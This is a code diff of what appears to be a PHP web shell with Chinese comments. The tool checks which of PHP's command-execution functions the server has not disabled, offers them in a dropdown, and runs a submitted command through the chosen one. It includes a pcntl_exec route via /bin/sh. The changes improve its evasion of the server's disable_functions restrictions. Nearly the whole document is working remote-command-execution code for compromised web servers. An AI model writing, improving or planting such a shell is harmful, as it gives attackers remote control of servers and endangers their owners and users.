@@ -5,6 +5,7 @@
         header('Content-Type: text/html; charset=' . $_POST['encoding']);
     }
 
+
     /**
      * 获取环境的基本信息
      */
@@ -23,6 +24,7 @@
         echo '<hr>';
     }
 
+
     /**
      * 获取php.ini中被禁用的函数名
      * @param bool $display 是否显示disable_functions
@@ -30,12 +32,11 @@
      */
     function get_disable($display=false) {
         $func = ini_get('disable_functions');
+        echo (function_exists('pcntl_exec') ? 'pcntl_exec is available' : 'pcntl_exec is unavailable') . LINE;
 
-        if (!$func) {
-            if ($display) {
-                echo 'No disabled functions found !' . LINE . LINE;
-            }
-            return;
+        if (!$func && $display) {
+                echo 'No disabled function found ! ' . LINE . LINE;
+            return array();
         }
 
         $func = explode(',',$func);
@@ -48,12 +49,17 @@
         return $func;
     }
 
+
+    /**
+     * 生成select下拉菜单
+     */
     function generate_select() {
         echo '<select name="func">';
         $available = array('shell_exec','system','exec','passthru','popen','proc_open','pcntl_exec');
-        $func = get_disable(false);
-        if (!$func) {
-            foreach ($available as $fun) {
+        $disable = get_disable(false);
+
+        foreach ($available as $fun) {
+            if (!in_array($fun, $disable) && function_exists($fun)) {
                 // 参数记忆
                 if ($_POST['func'] == $fun) {
                     echo '<option selected>' . $fun . '</option>';
@@ -61,15 +67,11 @@
                 }
                 echo '<option>' . $fun . '</option>';
             }
-        } else {
-            foreach ($func as $fun) {
-                if (!in_array($fun, $available)) {
-                    echo '<option>' . $fun . '</option>';
-                }
-            }
         }
         echo '</select>';
     }
+
+
     /**
      * 执行命令并显示执行结果
      * @param $cmd 要执行的命令
@@ -79,24 +81,24 @@
         switch ($func) {
             case 'shell_exec':
                 echo shell_exec($cmd);
-                return;
+                break;
             case 'exec':
                 exec($cmd,$res);
                 foreach ($res as $line) {
                     echo $line . LINE;
                 }
-                return;
+                break;
             case 'system':
                 system($cmd);
-                return;
+                break;
             case 'passthru':
                 passthru($cmd);
-                return;
+                break;
             case 'popen':
                 $handle = popen($cmd, "r");
                 echo stream_get_contents($handle);
                 pclose($handle);
-                return;
+                break;
             case 'proc_open':
                 $arr = array(
                     0 => array('pipe','r'),
@@ -107,16 +109,16 @@
                 fclose($pipes[0]);
                 fclose($pipes[1]);
                 proc_close($process);
-                return;
+                break;
             case 'pcntl_exec':
-                if (strpos(php_uname('s'),'dow')) {
-                    // Pass Windows Environment
-                    return;
+                // 此函数较特殊，CLI下可以使用，Web下需要判断
+                if (function_exists('pcntl_exec')) {
+                    $args = explode(' ',$cmd);
+                    array_unshift($args,'-c');
+                    $shell = '/bin/sh';
+                    pcntl_exec($shell,$args);
                 }
-                $args = explode(' ',$cmd);
-                array_unshift($args,'-c');
-                $shell = '/bin/sh';
-                pcntl_exec($shell,$args);
+                break;
         }
         echo '</pre>';
     }
